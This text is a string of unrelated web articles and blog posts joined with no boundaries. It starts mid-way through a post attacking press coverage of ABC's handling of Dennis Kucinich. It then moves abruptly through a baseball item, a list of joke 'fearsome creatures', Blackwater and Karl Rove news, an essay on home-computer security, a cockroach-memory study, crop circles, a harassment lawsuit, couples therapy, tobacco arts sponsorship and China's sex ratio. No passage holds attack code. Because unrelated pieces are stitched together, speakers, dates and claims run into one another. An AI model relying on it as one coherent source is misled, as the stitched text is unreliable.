Yet it gets worse : in the critical first half of the debate ( the time when viewers tend to be most engaged ) , Kucinich received just 3.4 % of airtime , the least of all the candidates .
To put that in context , Hillary Clinton , John Edwards and Barack Obama combined to chew up 60.4 % of airtime during the first half of the debate .
USA Election Polls also points out :
In fact , even Chris Dodd got more air time than Kucinich which is ridiculous because Kucinich is beating Dodd in the majority of state polls .
So if the emphasis was on giving the most time to the leaders in the polls , then what was Dodd doing speaking more than Kucinich ?
Nevertheless , Tumulty and Time magazine show no interest in such further incontrovertible proof of the unfair treatment to which ABC News subjected Congressman Kucinich .
Instead , Tumulty follows up Jones ' " bottom line " by closing her post with these thoughts :
I honestly do n't know what the right balance is here when you are dealing with such a large field of candidates , most of whom do n't have a prayer of winning .
What do you think ?
Was Kucinich treated unfairly ?
Or should he be included at all ?*
* Not a scientific survey .
Cute .
But parting shot at the Kucinich campaign aside , should n't Tumulty and Time magazine provide the facts in a piece titled " Dennis Kucinich vs. ABC News " ?
Instead , we 're presented with a slanted , inaccurate , misleading and ill - researched breakdown of events that ends with Tumulty floating the question of whether Kucinich should be allowed to attend these debates in the first place .
And sadly , thanks to The Washington Post , that was n't the worst coverage of the Kucinich - ABC incident by a major news outlet .
In a post titled " Kucinich Mad at ABC " over at The Washington Post blog The Sleuth ( oh the irony ) , journalist Mary Ann Akers ( a former reporter for The Washington Times as well as NPR ) does n't try to hide her contempt for Kucinich while barreling ahead without concern for facts or fact - checking .
She opens her post :
Do n't expect to see too many more appearances by Rep. Dennis Kucinich ( D - Ohio ) on ABC News .
An apparently irate Kucinich sent out a letter to supporters Wednesday accusing the network of ignoring him in the Democratic presidential debate on Sunday 's " This Week with George Stephanopoulos . "
So since Kucinich - along with , and spurred on by , thousands of other American citizens - objected to ABC 's handling of the debate , should we expect , and accept , that ABC has a right to actively work to further marginalize him ?
If that 's Akers ' frame , you can guess where this is going .
Also , because she fails to cite any source , we must assume her characterization of Kucinich as " apparently irate " hinges not on fact but projection .
And as it turns out , that is exactly the case .
Yesterday , when I contacted Kucinich campaign spokesman Andy Juniewicz , he addressed Akers unfounded assertion :
" Congressman Kucinich was not irate .
Nothing in the email communication expressed anger , " said the soft - spoken Juniewicz .
" It was just a delineation of what we were hearing from thousands of people who contacted us , many of whom were n't even Kucinich supporters .
We asked ABC to respond to the questions they raised . "
When I asked if Akers or someone else at The Washington Post had spoken with anyone in his campaign about this purported demonstration of anger , Mr. Juniewicz said , " No. No one . "
Note to Akers and The Washington Post : Before the Internets , there was the telephone .
Some news outlets , though fewer and fewer these days , still find it handy for checking facts .
Moving right along , Akers then runs through roughly the same terrain on which Tumulty trodded , but her condescension and bias is profligate and shameless .
Among Kucinich 's charges : he was " deliberately cropped out " of photos ; after he took a " commanding lead " in ABC 's online survey , the survey was mysteriously " dropped from prominence on the web site " ; and " as every viewer of the nationally televised Sunday presidential forum is aware " Kucinich was not asked a question until 28 minutes into the program .
( Everyone clocked that at 28 minutes , right ? )
" Among Kucinich 's charges " blunts the fact they 've all been proven to be true ( something Akers apparently has no interest in uncovering or presenting ) .
Use of the word " mysteriously " not only mocks the assertion that the poll was buried but conjures the mainstream media 's favorite attack on uncomfortable truths : it must be the work of those crazy conspiracy theorists ( Akers also disregards the full story - previously addressed above in this post - behind ABC 's bizarre and devious manipulation of the debate 's polls ) .
" Everyone clocked that at 28 minutes , right ? " is not only disparaging but gives the ludicrous impression the Kucinich campaign is contending everyone noticed the precise number of minutes Kucinich had been shut out of the debate ; rather , the campaign was noting a simple fact : everyone watching certainly saw that Kucinich did n't get a chance to speak for an usually long duration of time .
We deserve more than such absurd manufactured nitpicking from Akers and The Washington Post .
Rather than chasing their tail to portray Kucinich in a poor light , think of how much easier it would 've been to just present the facts .
And to search them out .
But hey , according to Akers , " ABC News Executive Director Andrea Jones addressed every charge Kucinich made . "
Incredibly , Akers not only embraces Jones ' answers without question , but also unwittingly contradicts Jones ' claim that the photo in question was never cropped by providing the ABC debate photo below her post .
In other words , the AP photo that ABC undeniably cropped is sitting below Akers ' post in which she contends no cropping occurred .
Again , all one needs to do is locate the original AP photo .
And presto !
Cropping mystery solved .
Again , too , Jones is either lying or misinformed , and Akers and The Washington Post ( along with Tumulty and Time magazine ) are complicit in perpetuating this falsehood .
Escaping Akers ' notice or range of journalistic concern as well is ABC 's wholesale swapping out of its cropped photo with an altogether new one in which Kucinich appears alongside the rest of the Democratic candidates .
ABC
News , in effect , has worked diligently to cover up this despicable act , one worthy of Fox News and Orwell 's vision of totalitarian media manipulation .
In their coverage of the Kucinich - ABC incident , Time magazine 's Tumulty and The Washington Post 's Akers wind up crystallizing the extent to which big media rigs the game against a candidate like Congressman Kucinich .
In defense of sound and equitable journalism , it is incumbent upon both Time magazine and The Washington Post to correct the record on ABC 's actions , and the rest of the news media to hold ABC News accountable for this disgraceful performance .
No news organization - especially one charged with facilitating part of our electoral process - should be able to so grossly transgress such basic journalistic standards and not be held to account .
This is n't a partisan issue .
Congressman Kucinich 's chances of capturing the Democratic nomination are irrelevant to this matter .
This speaks to the viability of our national press .
At a time when the mainstream media is struggling to retain and rebuild both its credibility and coveted market share among Americans , it ignores ABC 's actions at its own peril .
UPDATE : I 'll be away until after Labor Day weekend ( wedding - not mine ) , but I first wanted to say thanks for your additional insights , passionate ( yet substantive ) comments and very kind words .
To first - time readers , welcome !
To everyone , by all means , keep the conversation going while I 'm away .
And if you want to do something else to keep ( or turn up ) the heat on ABC , request that this story does not stop here .
Do n't just contact ABC or other mainstream news outlets - contact Raw Story , Salon , Think Progress , Media Matters , FAIR.org and Truthout , and respectfully request they cover this story .
Along with Crooks and Liars , these major alternative news outlets get the mainstream 's attention and greatly increase the chances of forcing the mainstream 's hand .
More than anything , ABC wants this story to drop right down the memory hole : it 's up to you to make sure that does n't happen .
KANSAS CITY , Mo. --
Just in case his 499th homer turns out
to be No. 500 , Alex Rodriguez already has the ball .
The Yankees ' third baseman , set to become the youngest member of
the 500 - homer club , hit an eighth - inning drive off Gil Meche in
Wednesday night 's 7 - 1 victory over the Kansas City Royals .
The ball
landed in a grassy area beyond the right field fence , where it was
retrieved and given to A - Rod .
Here 's where it gets complicated .
On Friday , A - Rod will be on deck when the Yankees resume a
suspended game against the Orioles in the eighth inning .
If he
homers in the completion of the suspended game , it would count as
being hit on June 28 , when the game began .
That would make it home
run No. 493 -- and Wednesday night 's would become No. 500 .
The rule , 10.23 ( d ) , states : " All performances in the
completion of a suspended game shall be considered as occurring on
the original date of the game . "
Manager Joe
Torre knows it well .
His only five - hit game as a
player came in 1971 -- his National League MVP season with St. Louis
-- in a suspended game against Philadelphia .
" I had to wait a couple of months between my fourth hit and my
fifth hit , " Torre said .
A - Rod , who turns 32 on Friday , would surpass Jimmie Foxx ( 32
years , 338 days ) as the youngest player to reach 500 homers .
He
would also be the 22nd to reach the mark and the second this season
behind Frank Thomas .
But with the Yankees chasing Cleveland in the AL wild card race
and slowly closing on Boston in the AL East , Rodriguez -- who did
not speak to reporters before Thursday night 's game -- has played
down the chase for his 500th .
" Hopefully , " he said Wednesday , " 500 comes with a victory . "
Rodriguez was scheduled to face Royals starter Jorge De La Rosa ,
who gave up Rodriguez 's 400th career homer on June 8 , 2005 .
" It 's a crazy thing , " Rodriguez said .
" It 's pretty
unbelievable that it could actually work out that way . "
Torre said he still had not decided who will pitch when the
suspended game resumes .
Mike Myers was on the mound at the end of
the seventh , and Torre has said he would see whether his team
scores again in the eighth before making a decision .
" It 'll be nice to say , ' We can use you .
I know you pitched
yesterday , but this is two months ago and you have n't gone for
three days .
You should be all right , " ' Torre said with a laugh .
It 's not always fun to introduce visitors to your local flora and fauna .
Dealing with tourists can be a real chore .
So the habit of pulling their legs a bit can be a welcome bit of fun .
It goes on all over the world , so when you are traveling , be aware that there may be a bit of poking fun going on ... especially if you 're told of a scary local animal to beware .
A Snipe ( Gallinago naivitus ) is the classic animal used for practical jokes , as in the snipe hunt .
The person upon who the joke is played is convinced to hold a bag while the others chase the snipe into it .
Variations include using ridiculous methods of attracting and / or chasing the snipe .
In the end , the patsy is left all alone for however long they will stay put .
The term " left holding the bag "  may have arisen from this trick .
The snipe is supposedly a very difficult animal to shoot , therefore , a crack shot is called a " sniper . " 
However , the word snipe refers to around 20 species of real wading birds .
The Drop Bear ( Phascolarctos carnivorous ) is a truly scary animal .
A marsupial native to Australia , it is a vicious carnivore that attacks its prey by hiding high in a tree and dropping onto unsuspecting tourists .
Photos of a drop bear show a startling resemblence to a koala , which is how the sneaky beasts fool you into standing under their trees .
See the Drop Bear in action in this video starring Peter Holt .
The Hodag ( Bovinus spiritualis ) is a ferocious animal native to Wisconsin .
The black hodag was first discovered in 1893 and is the largest of the several hodag species .
It has two horns and a series of spikes along its spine .
There are also the sidehill dodge hodag , the cave hodag , and the shovel - nose hodag .
See a video about a hodag sighting here .
More fearsome creatures , after the jump .
The Jackalope ( Lagomorpha fantasticus ) is a cross between a rabbit and an antelope ( or sometimes a goat or deer ) .
Jackalopes only mate during electrical storms .
They can be caught by using whiskey as bait , which will render them easier to sneak up on .
Jackalope milk is suposed to have medicinal qualities .
The German version is called the Wolpertinger ( Crisensus bavaricus ) , which has wings .
The legend of the jackalope may have come from sightings of rabbits infected with the Shope papillomavirus , which causes hornlike growths .
The Hoop Snake ( Serpentus circulus ) is native to the American west , although it has also been claimed by Pennsylvania and Australia .
This snake has the ability to bite its tail and form a circle , then roll like a wheel , enabling it to chase people much faster than they can run away .
It has a poisonous stinger in its tail , which can kill on contact .
The only reliable sightings have been in carnival sideshows .
See a video of a hoop snake in action here .
The Wild Haggis ( Haggis scoticus ) is native to Scotland .
Their distinctive feature is that the four legs are different lengths .
There are two species , one with longer legs on the left , the other with longer legs on the right .
They cannot interbreed , because the male loses his balance attempting to mate .
You can tell the male haggis from the female because the male only runs on a clockwise direction , and the female runs counterclockwise .
Haggis is also a traditional Scottish entree ( shown on the right ) .
The Pacific Northwest Tree Octopus ( Octopus paxarbolis ) is an amphibious creature native to the Olympic National Forest in Washington State .
The octopus is an endangered species , with an organization devoted to its survival .
The site has been used in studies to determine how easily people believe what they see on the internet .
Ice Worms ( Mesenchytraeus solifugus ) are real .
Scientists have studied them for years .
That has n't stopped them from also becoming a hoax used to impress tourists in the northern regions .
The Ballad of the Ice Worm Cocktail by Robert Service established the ice worm as a myth , and bars in Alaska and Canada still serve ice worm cocktails containing a piece of cooked spaghetti .
The town of Cordova , Alaska has an Ice Worm Festival every February .
This list is far from inclusive .
Are there other local animal legends you can add ?
WASHINGTON , Oct. 1 — Employees of Blackwater USA have engaged in nearly 200 shootings in Iraq since 2005 , in a vast majority of cases firing their weapons from moving vehicles without stopping to count the dead or assist the wounded , according to a new report from Congress .
In at least two cases , Blackwater paid victims ’ family members who complained , and sought to cover up other episodes , the Congressional report said .
It said State Department officials approved the payments in the hope of keeping the shootings quiet .
In one case last year , the department helped Blackwater spirit an employee out of Iraq less than 36 hours after the employee , while drunk , killed a bodyguard for one of Iraq ’s two vice presidents on Christmas Eve .
The report by the Democratic majority staff of a House committee adds weight to complaints from Iraqi officials , American military officers and Blackwater ’s competitors that company guards have taken an aggressive , trigger - happy approach to their work and have repeatedly acted with reckless disregard for Iraqi life .
But the report is also harshly critical of the State Department for exercising virtually no restraint or supervision of the private security company ’s 861 employees in Iraq .
“ There is no evidence in the documents that the committee has reviewed that the State Department sought to restrain Blackwater ’s actions , raised concerns about the number of shooting episodes involving Blackwater or the company ’s high rate of shooting first , or detained Blackwater contractors for investigation , ” the report states .
Home Users : A Public Health Problem ?
To the average home user , security is an intractable problem .
Microsoft has made great strides improving the security of their operating system “ out of the box , ” but there are still a dizzying array of rules , options , and choices that users have to make .
How should they configure their anti-virus program ?
What sort of backup regime should they employ ?
What are the best settings for their wireless network ?
And so on and so on and so on .
How is it possible that we in the computer industry have created such a shoddy product ?
How have we foisted on people a product that is so difficult to use securely , that requires so many add - on products ?
It ’s even worse than that .
We have sold the average computer user a bill of goods .
In our race for an ever - increasing market , we have convinced every person that he needs a computer .
We have provided application after application — IM , peer - to - peer file sharing , eBay , Facebook — to make computers both useful and enjoyable to the home user .
At the same time , we ’ve made them so hard to maintain that only a trained sysadmin can do it .
And then we wonder why home users have such problems with their buggy systems , why they ca n’t seem to do even the simplest administrative tasks , and why their computers are n’t secure .
They ’re not secure because home users do n’t know how to secure them .
At work , I have an entire IT department I can call on if I have a problem .
They filter my net connection so that I do n’t see spam , and most attacks are blocked before they even get to my computer .
They tell me which updates to install on my system and when .
And they ’re available to help me recover if something untoward does happen to my system .
Home users have none of this support .
They ’re on their own .
This problem is n’t simply going to go away as computers get smarter and users get savvier .
The next generation of computers will be vulnerable to all sorts of different attacks , and the next generation of attack tools will fool users in all sorts of different ways .
The security arms race is n’t going away any time soon , but it will be fought with ever more complex weapons .
This is n’t simply an academic problem ; it ’s a public health problem .
In the hyper - connected world of the Internet , everyone ’s security depends in part on everyone else ’s .
As long as there are insecure computers out there , hackers will use them to eavesdrop on network traffic , send spam , and attack other computers .
We are all more secure if all those home computers attached to the Internet via DSL or cable modems are protected against attack .
The only question is : what ’s the best way to get there ?
I wonder about those who say “ educate the users . ”
Have they tried ?
Have they ever met an actual user ?
It ’s unrealistic to expect home users to be responsible for their own security .
They do n’t have the expertise , and they ’re not going to learn .
And it ’s not just user actions we need to worry about ; these computers are insecure right out of the box .
The only possible way to solve this problem is to force the ISPs to become IT departments .
There ’s no reason why they can’t provide home users with the same level of support my IT department provides me with .
There ’s no reason why they ca n’t provide “ clean pipe ” service to the home .
Yes , it will cost home users more .
Yes , it will require changes in the law to make this mandatory .
But what ’s the alternative ?
In 1991 , Walter S. Mossberg debuted his “ Personal Technology ” column in The Wall Street Journal with the words : “ Personal computers are just too hard to use , and it is n’t your fault . ”
Sixteen years later , the statement is still true­ — and doubly true when it comes to computer security .
If we want home users to be secure , we need to design computers and networks that are secure out of the box , without any work by the end users .
There simply is n’t any other way .

In its ability to learn , the cockroach is a moron in the morning and a genius in the evening .
Dramatic daily variations in the cockroach 's learning ability were discovered by a new study performed by Vanderbilt University biologists and published online this week in the Proceedings of the National Academy of Sciences .
" This is the first example of an insect whose ability to learn is controlled by its biological clock , " says Terry L. Page , the professor of biological sciences who directed the project .
Undergraduate students Susan Decker and Shannon McConnaughey also participated in the study .
The few studies that have been done with mammals suggest their ability to learn also varies with the time of day .
For example , a recent experiment with humans found that people 's ability to acquire new information is reduced when their biological clocks are disrupted , particularly at certain times of day .
Similarly , several learning and memory studies with rodents have found that these processes are modulated by their circadian clocks .
One study in rats associated jet lag with retrograde amnesia .
In the current study , the researchers taught individual cockroaches to associate peppermint - a scent that they normally find slightly distasteful - with sugar water , causing them to favor it over vanilla , a scent they find universally appealing .
The researchers trained individual cockroaches at different times in the 24 - hour day / night cycle and then tested them to see how long they remembered the association .
They found that the individuals trained during the evening retained the memory for several days .
Those trained at night also had good retention .
During the morning , however , when the cockroaches are least active , they were totally incapable of forming a new memory , although they could recall memories learned at other times .
" It is very surprising that the deficit in the morning is so profound , " says Page .
" An interesting question is why the animal would not want to learn at that particular time of day .
We have no idea . "
Most previous studies of circadian rhythm have focused on the visual system .
" The advantage of eyes becoming more sensitive at night is so obvious that people have n't looked much at other sensory systems , " says Page .
" The fact that our study involves the olfactory system suggests that the circadian cycle could be influencing a number of senses beyond vision . "
In the study , the researchers used cockroaches of the species Leucophaea maderae .
It does n't have a common name but it is commonly used in scientific experiments because it was used extensively in early physiological and endocrinological studies .
The discovery that the cockroach 's memory is so strongly modulated by its circadian clock opens up new opportunities to learn more about the molecular basis of the interaction between biological clocks and memory and learning in general .
Much of the new information about the molecular basis of memory and learning has come from the study of other invertebrates ( animals without backbones ) such as the sea slug ( Apylsia ) and the fruit fly ( Drosophila ) .
" Studies like this suggest that time of day can have a profound impact , at least in certain situations .
By studying the way the biological clock modulates learning and memory we may learn more about how these processes take place and what can influence them , " Page says .

A floor of chequered tiles stretches down a long , high - ceilinged corridor with doors leading off each side .
And the art of crop circles reaches a new height of sophistication .
The astonishing three - dimensional design , 200ft in diameter , has been created in a wheat field at Silbury Hill , Wiltshire .
Only yards away are the 5,000 - year - old West Kennet Longbarrow burial grounds , one of the largest and most impressive Neolithic graves in Britain .
Scroll down for more
According to folklore , the mound is traditionally visited at sunrise on Midsummer 's Day by a white figure accompanied by a white hound with red ears .
It has been the setting for several crop circles in the past , including an elaborate 350ft pattern featuring a giant Egyptian mosaic in the shape of two wings , surrounded by symbols which bear a striking resemblance to the Mayan calendar which predicted that the world will end in 2012 .
The latest design was photographed by Steve Alexander , who with his wife Karen , a writer , has been researching crop circles for more than 15 years .

Mrs Alexander - said : " It 's one of the most architectural designs we have seen , rather than purely geometric .
" In traditional geometry a square represents material reality and a circle represents the divine or heavenly realm .
" A lot of people are saying this circle represents the passageway through the physical world to the divine world . "

WASHINGTON , April 13  Karl Rove , the chief political strategist for President Bush , did not intentionally delete e-mail messages to avoid creating a paper trail detailing his work , his lawyer said on Friday .
Rather , he mistakenly thought that the messages were being preserved by the Republican National Committee .
“ Karl has always understood that his R.N.C. e-mails were being archived , ” the lawyer , Robert Luskin , said in an interview .
“ He has never asked or sought any kind of special treatment to permit him to delete anything . ”
In addition to their government e-mail addresses , Mr. Rove and 21 other White House officials maintain e-mail accounts with the national committee that are supposed to be used for political business only .
Facing questions from Democrats and in the news media , the White House has said that some e-mail messages from the political accounts are missing and that it is working to recover them .
The party committee , which until August 2004 automatically deleted e-mail from its server after 30 days , has said it has no e-mail records for Mr. Rove before 2005 .
But Rob Kelner , a lawyer for the R.N.C. , said that work to recreate the lost records was under way on Friday and that some e-mail had already been retrieved .
Sexual harassment cases are nothing new on Wall Street , but CNBC has uncovered new details of one of the most salacious cases to hit a big trading house in a long time .
The case involves a sexual harassment lawsuit filed by a Andrew Z. Tong , a former junior trader at SAC Capital , the powerful Greenwich , Conn. , hedge fund , against one of SAC ’s top producers , a trader named Ping Jiang .
A New York State judge has sealed the case and sent the lawsuit into arbitration , where both sides would battle it out in private .
He even cancelled oral arguments that were scheduled for Thursday following an appeal by Tong ’s lawyers , who want the case to remain in state court .
The judge said he sealed the details of Tong ’s allegations contained in the lawsuit because it is not in the public interest to disclose the salacious nature of the complaints .
CNBC has learned the suit includes the following allegations made by Tong against Jiang :
After being hired at SAC , Tong alleges that Jiang came to him and told him he had a trading method in which his traders must not be too aggressive ; that traders must be more effeminate and to do so , he directed Tong to begin taking female hormones .
Tong says he then took the female hormones that he bought on the black market .
Tong then alleges he suffered emotional and physical distress .
The hormones , he says , caused him to begin wearing women 's clothes .
He also could not perform sexually with his wife , who wanted to have a baby .
Tong says the sexual harassment included sexual relations between the two men .
Tong 's attorney had no comment .

Bill Moyers meticulously documents Erik Prince 's exhaustive spin campaign over the last week , offering a crystal clear picture of how professional deceivers operate .

Prince 's rehearsed answer about Blackwater not being a mercenary force -- " we 're Americans fighting for America " / " a mercenary force is hired by a foreign army " -- shows just how out of touch and clueless he is .
From the Iraqi perspective , Blackwater fits perfectly the definition of a mercenary force -- a for - profit killing force hired by ( our ) foreign army .
Does he really not see that ?
The entire interview with Blackwater expert Jeremy Scahill -- who wrote the definitive book on the rise of the private army -- can be streamed from the PBS site .
Scahill does a tremendous job of exposing Prince and Blackwater for what they are -- a taxpayer - funded , for - profit , private killing force that operates outside the rule of law .
“ Maybe you can help me with this , ” he said now to Coché , “ because I ’m not feeling good about ” Marie .
He could n’t explain his reaction to her behavior much beyond that , which was typical for him , and Coché intervened .
This was n’t just about Marie , she said .
This was an opportunity for people to consider how they cope in their own lives with silent , smoldering presences who swat them back by insisting everything is “ fine . ”
The group had plenty to say , though nobody directly condemned Marie , despite palpable frustration at how she kept repeating “ fine means fine . ”
The young wife who feared her husband might turn into Clem went so far as to thank her — and sounded as if she meant it — for helping her to realize how pained she was when she recently called home and her father picked up the phone and passed it wordlessly to her mother .
( “ He loves you even if he does n’t always show it , ” her mother stammered . )
Her father had always retreated into silence when he did n’t know how to solve her problems , she said , and while she did n’t know exactly why he was upset this time , she thought that perhaps it was because , as she ’d previously informed the group , she ’d had a miscarriage and her father wanted her to wait longer before trying to become pregnant again .
As the colloquy ground on , Marie ’s eyes just got narrower , her protestations more verbose , until Coché offered that maybe , just maybe , Marie was “ transferring ” onto the group members , transforming them into siblings , such that she could never be persuaded that the people surrounding her here 30 years later were n’t merely attacking her .
“ O.K. , ” Marie said , simply .
It was as if she ’d awakened from a nasty fugue .
In the next group , she was practically cheerful — was it because she and Clem had had a good month , as they both said , or because Marie ’s considerable pride had been wounded by the Pilates debacle and she wanted the group to know that she was still a force to be reckoned with — that she was n’t going to stay in the role of traumatized victim ?
The respite was brief , however .
Veiled belligerence toward Coché and indifference toward her fellow group members — many of whose names she told me near the end of the group she could barely recall — would continue to emanate from Marie .
And every so often she ’d say something that overtly betrayed her attitude , like when Coché asked whether she ’d help the young wife with a difficulty the two had in common .
Marie paused for what seemed like forever , before saying :
If by help you mean letting her listen “ as I explore this issue , ” fine , I ’ll help — but do n’t expect anything more from me .
Still , Coché believed that the group had Marie to thank for amping up the level of intensity and frankness in the room .
The group was a little low on the “ affect side , ” she told me , meaning for quite a while people seemed stuck in the superficial “ joining stage , ” unwilling to feel , never mind express , much emotion .
Marie got their “ juices flowing , ” as one of the men put it , if only because she stoked their ire .
For instance , during the Pilates weekend that I came to regard as “ Marie ’s Insurrection : Part I , ” the young wife and her husband had their first honest , heartfelt exchange about how divisive and frightening it had been to suffer a miscarriage .
Until that point , the woman had alluded to the loss only in abstracted psychobabble : “ I ’ve been trying to honor the missing . ”
Or : “ I feel very healthy about not worrying about not being sad . ”
As locked in her ways as Marie could seem in the group , she and Clem reported an upswing in their marriage during the second half of the year .
Several times , Clem said he was realizing that he ’d contributed to their knot of unhappiness by repressing his own anger and dissatisfaction and was trying to be more vocal and assertive .
The group noted that his posture seemed better ; he ’d stopped slumping on the couch like a teenager being scolded by his mother .
Marie , who went for years believing she did n’t have “ the right ” to expect anything from a man other than what he decided to bestow , was asking for what she wanted from Clem and doing so more considerately , they both agreed .
Her so - called submission did n’t work , anyway , she acknowledged , because her fury just festered ( and was hardly hidden ) .
The couple were having sex a little more , Clem said , and once he went so far as to say he felt “ lucky ” to be married to Marie .
But the progress was fitful , and the group observed how defeating it would feel to live with someone whose main weapon was to become more passive , more ( spitefully ) a good guy .
Clem and Marie got into a protracted debate about why he had “ disregarded ” her and taken a basket of clothes to the basement , when the previous night she unambiguously stated that she wanted to do the laundry herself .
For at least an hour , the group batted around how Marie could have made the request more gracefully — with Clem chiming in to say he was just trying to help out .

Welcome to the CHI :
Cigarette maker Altria / Philip Morris ( PM ) recently announced that it is moving its New York headquarters to Richmond , Virginia , and that it will end its corporate sponsorship of the arts in New York .
Predictably , New York arts organizations are crying over the loss of cigarette dollars .
These organizations sadly believe that their acceptance of PM dollars has been benign .
In truth , these organizations have helped PM advance its credibility and legitimacy with policymakers , and have done tremendous harm to the country .
We can no longer put our heads in the sand about the implications of accepting tobacco dollars .
Tobacco industry documents are rife with insights about the public relations benefits tobacco companies derive from sponsorship of arts , culture , sports , and music .
Arts sponsorship is nothing more than a branch of PM's " third party strategy , " a massive , decades - long public relations plot to gain political support from diverse groups that under normal circumstances would never come to the aid of a tobacco company .
The third party technique is described in a transcript of a 1984 PM Corporate Affairs World Conference ,
... the whole question of getting third - party assistance and enlisting this whole third - party concept in our defense structure is to give us clout , to give us power , to give us credibility , to give us leverage , to give us access where we do n't ordinarily have access ourselves ...
Accordingly , PM has long used generous support of the arts to achieve its desired credibility , clout , leverage , access and power .
A 1990 Philip Morris Corporate Affairs memo reveals that PM's uses sponsorships to " create goodwill that benefits PM by influencing public opinion , which turn is used by us to influence political opinion / action . "
The memo says that company involvement in community programs " can only be of real value [ to PM ] if they succeed in gaining us political friendships and the opportunity to engage key Government decision makers ... "
Arts sponsorships allow the company to activate arts groups to support or oppose key legislation regarding tobacco products .
In 1994 , when a proposal was introduced to restrict public smoking in New York , PM threatened to withdraw its arts sponsorships as a way to motivate arts groups to oppose the measure .
An October 5 , 1994 New York Times article titled " Philip Morris Calls In IOU 's in the Arts , " reported that PM executives " telephoned arts institutions that had benefited from their largesse " and asked them call New York City council members to " put in a good word " for the company with respect to the proposal .
Many arts groups acquiesced .
Arts groups are particularly susceptible to PM 's influence because they are such financially needy groups .
PM has clearly exploited this weakness to advance their corporate agenda .
Philip Morris ' products contribute to the painful , suffocating deaths of over 400,000 Americans every year .
Far more people are regularly killed by smoking than have ever been killed by terrorist acts nationally , or worldwide .
Given the exposure of the tobacco industry 's previously secret , internal documents , there is no longer any shred of doubt that PM 's corporate philanthropy , including giving to the arts , is carefully tailored to advance the company 's political interests and help stave off effective regulation of its products .
New York City arts groups should be grateful the decision to forgo tobacco funds is finally being made for them , and move on to procuring more legitimate funding .

Here and there around the country debates are raging over whether or not to open City Council meetings with The Pledge of Allegiance .
This discussion is the very definition of the political “ red herring ” .
Nothing could be less critical or more distracting from the real issues of priority facing our nation .
Most civil servants across the nation from members of Congress to Water Commissioners swear an oath upon taking office something along the lines of promising to “ support and defend the Constitution of the United States against all enemies foreign and domestic ” .
I would hope your City Council is no different .
The flag is a symbol which holds no intrinsic value apart from that with which it is embued by each individual beholder .
Some see the American flag as a symbol of the highest patriotism and sacrifice , others as far too often being misused as a jingoistic manipulative tool .
Both perspectives are of value and should not be disregarded .
The Constitution , on the other hand , is a living document refined and perfected over 230 years of blood , sweat and Congressional review representing the highest evolution of democratic ideals and dreams such as habeas corpus ( due process ) which traces back to the signing of the Magna Carta in 1215 and before .
On the heels of Patriot Acts I & II , the Military Commissions Act and most recently S. 1927 which further gutted our 4th Amendment protections against illegal searches and seizures , our Constitutional “ Liberty and Justice for All ” are on life support in Washington D.C. under the misguided aegis of President George W. Bush and Vice President Richard B. Cheney .
Do you value your privacy ?
Your rights to it are dead .
Did you notice ?
It is high time for all Americans to reconsider our loyalties , which should not be to political party , to President or to any person and certainly not to a symbol .
Our loyalty should be to the Constitution to which every public servant and every member of our military swears to support , defend , protect , honor and otherwise regard as our most precious treasure .
Debating whether or not to begin City Council meetings with a pledge that schoolchildren can recite in their sleep is a distraction and a misdirection .
What all public servants must do at this time of grave crisis in America is be reminded of the oath they swore upon the commencement of their privilege of public service .
City Councils across the nation would make far better use of their time by authoring a resolution of support of the courageous stand taken by Rep. Dennis Kucinich ( D - OH ) in authoring H. Res. 333 and cosigned by nineteen of his contemporaries calling for impeachment proceedings to commence against Vice President Richard B. Cheney .
A collection recitation of their oaths of office to begin every City and Town Council in America would be a strong reminder of what their first and most important loyalty will always be – to the Constitution of the United States of America and the inalienable rights from which its genius was born .
PRESCHOOLERS will eat a carrot stick if it comes in a McDonald 's wrapper - a finding that will ring true with frustrated parents .
A study , published in the Archives of Pediatric Adolescent Medicine yesterday , found that children as young as three preferred to eat foods they believed to be from McDonald 's - even if those foods , such as a serve of vegetables , were not part of the fast - food giant 's menu .
Researchers tested 63 preschoolers from low - income families in California .
The children were each given two identical samples of three foods from McDonald 's , one in branded wrappers and the other in identical packaging bearing no brand .
They were also given milk and carrots .
The Olympics are around the corner .
Just as qualifying athletes are training hard for the big event , China seeks to put its best foot forward in response to critics at home and abroad .
Among the criticisms is a quiet but serious challenge : the artificially high number of Chinese men compared with Chinese women .
China should act expeditiously to correct the social and legal pressures that have converged to create this problem .
" Son preference " is a deep - seated , widespread problem in many cultures .
In many parts of the world , having a son is integral to one 's future financial and social wellbeing .
Recent articles have tried to shed light on the problem in India – putting much blame on the ultrasound machines women use to determine the sex of their unborn children in order to decide whether they should abort a female fetus .
In China , however , the problem takes on a frightfully larger scope when " son preference " meets the notorious One Child policy .
When the government only allows one child , it puts immense pressure on Chinese parents to determine the sex of their child in the womb , and terminate the pregnancy if it is a girl .
The unintended consequences of this government policy are staggering .
The proportion of male births to female births ( the " sex ratio " ) is not merely unusual , but alarming .
Worldwide , there are already 100 million girls " missing " due to sex- selective abortion and female infanticide , according to the English medical journal The Lancet .
Fifty million of these girls are thought to be from China .
In many provinces , the sex ratio at birth is between 120 to 130 boys for every 100 girls ; the natural number is about 104 .
What will happen in future decades when these boys grow up and look for wives ?
Among other things , such a situation would exacerbate the growing problem of sexual trafficking , which will surely have its hardest effect on the most vulnerable in the developing world as China grows richer .
Another serious threat is to regional stability and , by extension , international security .
As Valerie Hudson and Andrea den Boer recently wrote in their prize - winning work on demography and security , " Bare Branches , " surplus male populations in a region often result in violence – through banditry , rioting , or militarization .
The 6 to 5 male - female ratio in China means there are a lot of men who will not be able to start families .
If history is any guide , they will either find less savory things to occupy their time , or find women through equally unsavory means .
China should work to prevent sex - selective abortions and fix the gender balance , not only to avoid social and political instability , but also because women and men are equal .
The fundamental right to life exists regardless of one 's gender .
The means to correct China 's gender imbalance will hopefully prove as peaceable and wholesome as those being undertaken by Korea , whose government , religious , and cultural leaders have worked together for years to increase the value of girls in their culture and erase " son preference . "
While China is engaged in the early stages of similar efforts , it can bolster them through changes in policy .
An excellent step would be to enact and enforce laws that ban sex- selective abortion by targeting prenatal ultrasound use .
Likewise , certain perceived economic causes for China 's tradition of son preference could be undercut by changes in China 's social - welfare networks .
Most effective in balancing the sex ratio and affirming the rights of Chinese girls would be to abandon the odious one - child norm .
A tale from antiquity illustrates the potential tragedy of gender imbalance .
Ancient Rome began as a refuge for fugitives , full of young , high - spirited men but utterly lacking in women .
So Romulus held an athletic festival and encouraged guests to bring their wives and daughters .
At a set time , able - bodied Romans seized the assembled women in an event now known as the Rape of the Sabine Women .
As China hosts the world , the world should make clear to the Chinese government how abhorrent its one - child policy is , as are its resultant sex- selective abortions .
Let us take advantage of this opportunity and help the Chinese learn from the past to avoid demographic catastrophe and geopolitical instability in their future .
Rewriting Reddit
